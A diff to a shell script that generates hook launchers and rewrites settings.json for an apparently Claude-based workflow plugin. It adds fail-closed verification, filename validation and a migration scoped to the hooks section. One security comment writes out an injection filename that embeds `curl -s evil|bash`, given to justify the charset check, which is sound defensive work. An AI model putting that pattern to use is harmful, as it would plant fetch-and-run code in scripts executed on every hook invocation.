@@ -86,8 +86,24 @@ if [ "$DO_VERIFY" -eq 1 ]; then
 	fi
 	_log "✓ settings.json is valid JSON"
 
-	pinned=$(grep -coE 'claude-workflow-core/[0-9]+\.[0-9]+\.[0-9]+/hooks/' "$SETTINGS" || true)
-	if [ "${pinned:-0}" -gt 0 ]; then
+	# Count via the SAME jq walk --migrate uses, not a grep. The first version
+	# used `grep -coE 'claude-workflow-core/<semver>/hooks/'`, which diverged from
+	# migrate two ways: a SINGLE `claude-workflow-core` segment where migrate
+	# requires the DOUBLED one (so verify could flag refs migrate would never
+	# touch, prescribing a remedy guaranteed to no-op), and `grep -c` counts
+	# matching LINES — `-o` is inert beside it — so a compact settings.json
+	# reported 1 for 58 refs. One predicate, one count.
+	pinned=$(jq -r '
+	  [.. | strings
+	   | select(test("claude-workflow-core/claude-workflow-core/[0-9]+\\.[0-9]+\\.[0-9]+/hooks/"))]
+	  | unique | length
+	' "$SETTINGS" 2>/dev/null) || pinned=""
+	case "$pinned" in '' | *[!0-9]*)
+		_log "✗ could not enumerate pinned refs in $SETTINGS — refusing to report health (fail-closed)"
+		exit 1
+		;;
+	esac
+	if [ "$pinned" -gt 0 ]; then
 		_log "✗ $pinned version-pinned hook ref(s) remain — run --generate --migrate"
 		vrc=1
 	else
@@ -111,6 +127,13 @@ if [ "$DO_VERIFY" -eq 1 ]; then
 	if [ "$bad" -gt 0 ]; then
 		_log "✗ $bad of $total launcher ref(s) unresolvable"
 		vrc=1
+	elif [ "$total" -eq 0 ]; then
+		# "0 refs, all executable" is vacuously true and reads as a pass. A
+		# machine running this plugin is expected to have launcher refs, so an
+		# empty set means never-migrated, a wiped settings.json, or a jq failure
+		# swallowed above — every one of which is a problem, not health.
+		_log "✗ no launcher refs in $SETTINGS at all — hooks are not registered through launchers (run --generate --migrate)"
+		vrc=1
 	else
 		_log "✓ $total launcher ref(s), all executable"
 	fi
@@ -119,17 +142,42 @@ if [ "$DO_VERIFY" -eq 1 ]; then
 	# which cache version it lands on. A path existing is not the same as it
 	# working, and that version is the number that had hooks running a stale
 	# build for a whole session.
-	probe="$LAUNCHER_DIR/phase1-directive-pending-guard.sh"
-	if [ -x "$probe" ]; then
-		if printf '{"tool_name":"Bash","tool_input":{"command":"git diff"}}' |
-			"$probe" >/dev/null 2>&1; then
-			_log "✓ end-to-end: launcher executed a real hook payload (rc 0)"
-		else
-			_log "✗ end-to-end: launcher failed on a real hook payload"
+	# ASSERT ON RESOLUTION, NOT ON EXIT STATUS (#2536 r1 — critical).
+	#
+	# The first version piped a payload through the launcher and treated rc 0 as
+	# "✓ end-to-end: launcher executed a real hook payload". rc 0 is shared by
+	# THREE different outcomes, so it proved nothing:
+	#   - the hook ran and allowed          (healthy)
+	#   - the launcher FAILED OPEN because no cache version had the hook
+	#     (the precise failure this command exists to detect — and its warning
+	#      went to the stderr the check discarded with 2>&1)
+	#   - and a correct hook_deny exits 2, which was reported as "✗ failed"
+	# So it passed on an empty/GC'd cache and failed on correct deny behaviour.
+	#
+	# Now: capture the launcher's stderr and fail on its own fail-open sentinel,
+	# ignoring the hook's verdict entirely (forwarding is the launcher's job; the
+	# hook's allow/deny is not verify's business). And give the resolver check a
+	# real else — its rc was previously dropped on the floor.
+	probe_name="phase1-directive-pending-guard.sh"
+	probe="$LAUNCHER_DIR/$probe_name"
+	if [ ! -x "$probe" ]; then
+		_log "✗ probe launcher missing: $probe (launchers not generated?)"
+		vrc=1
+	else
+		probe_err=$(printf '{"tool_name":"Bash","tool_input":{"command":"git diff"}}' |
+			"$probe" 2>&1 >/dev/null) || true
+		if printf '%s' "$probe_err" | grep -qF 'no plugin-cache version'; then
+			_log "✗ end-to-end: launcher FAILED OPEN — no cache version ships hooks/$probe_name"
+			_log "  every hook is currently a silent no-op; the gating layer is off"
 			vrc=1
+		else
+			_log "✓ end-to-end: launcher forwarded to a real hook (no fail-open)"
 		fi
-		if _best=$(pcr_newest_complete "$(pcr_cache_root)" hooks/phase1-directive-pending-guard.sh); then
+		if _best=$(pcr_newest_complete "$(pcr_cache_root)" "hooks/$probe_name"); then
 			_log "✓ resolves to ${_best##*/}"
+		else
+			_log "✗ no cache version under $(pcr_cache_root) provides an executable hooks/$probe_name"
+			vrc=1
 		fi
 	fi
 	exit "$vrc"
@@ -150,6 +198,21 @@ if [ "$DO_GENERATE" -eq 1 ]; then
 	shopt -s nullglob
 	for hook in "$HOOKS_DIR"/*.sh; do
 		base=${hook##*/}
+		# SECURITY (#2536 r1 security-review): the basename is substituted into a
+		# script that is then chmod 755'd and exec'd on EVERY hook invocation, so
+		# it is an injection sink. `"`, `$`, `(`, `;` and newline are all legal in
+		# POSIX filenames, and @@HOOK@@ lands inside double quotes at three sites
+		# — a file named `x";$(curl -s evil|bash);".sh` would put the command
+		# INSIDE the generated launcher body. This repo is the SSOT bootstrapped
+		# into consumer repos, so a filename is supply-chain-reachable (a PR
+		# adding a file, or a tampered cache dir this loop later globs). Restrict
+		# to a conservative charset BEFORE the basename reaches pcr_launcher_body.
+		# Loud, not silent: a skipped hook gets no launcher, which --verify would
+		# otherwise report only as a missing ref.
+		if ! [[ $base =~ ^[A-Za-z0-9._-]+\.sh$ ]]; then
+			_log "WARN: skipping unsafe hook filename (refusing to generate a launcher): $base"
+			continue
+		fi
 		# Helpers (`_*`) and installers (`install-*`) are never invoked as hooks.
 		event_frontmatter_skip_basename "$base" && continue
 		# EVERY remaining hook gets a launcher — deliberately NOT gated on
@@ -316,6 +379,17 @@ tmp=$(mktemp "$(dirname "$SETTINGS")/.settings.XXXXXX") || {
 # Named per-step failures below: the reverted attempt wrapped every step in
 # `2>/dev/null` and emitted one message that could not say which step failed,
 # and asserted "settings left untouched" without knowing whether mv had run.
+# SCOPED TO .hooks, and replaces only the PATH PREFIX (#2536 r1 security).
+# The first version ran `walk()` over the WHOLE document and replaced the
+# ENTIRE matched string with "<dir>/<basename>". Two consequences: a
+# command carrying arguments (".../hooks/foo.sh --strict") silently lost
+# them, and a pinned path embedded in another subtree — a
+# permissions.allow rule like `Bash(/…/hooks/foo.sh:*)` — was rewritten
+# into a bare path, destroying the rule's syntax. Neither is recoverable
+# except from the backup, and both fail silently. (Checked against this
+# machine's pre-migration backup: 0 arg-bearing commands and 0 pinned
+# paths outside .hooks, so nothing was lost here — but it is luck, not
+# design.) Hook commands live under .hooks; nothing else may be touched.
 if ! jq --arg dir "$LAUNCHER_DIR" --argjson have "$have_json" '
   def relaunch:
     if type == "string" and test("claude-workflow-core/claude-workflow-core/[0-9]+\\.[0-9]+\\.[0-9]+/hooks/")
@@ -329,7 +403,17 @@ if ! jq --arg dir "$LAUNCHER_DIR" --argjson have "$have_json" '
          # does not exist. Leaving it pinned is strictly safer than dangling it.
          | (if ($have | index($b)) then ($dir + "/" + $b) else . end)
     else . end;
-  walk(relaunch)
+  # Scoped to .hooks[][].hooks[].command — NOT walk() over the whole document.
+  # Anything outside .hooks (permissions rules, statusLine, MCP args) is left
+  # byte-identical.
+  if has("hooks") then
+    .hooks |= with_entries(
+      .value |= map(
+        if type == "object" and has("hooks")
+        then .hooks |= map(if type == "object" and has("command")
+                           then .command |= relaunch else . end)
+        else . end))
+  else . end
 ' "$SETTINGS" >"$tmp" 2>/dev/null; then
 	rm -f "$tmp"
 	echo "install-hook-launchers: STEP=rewrite jq failed — $SETTINGS unchanged, backup at $bak" >&2
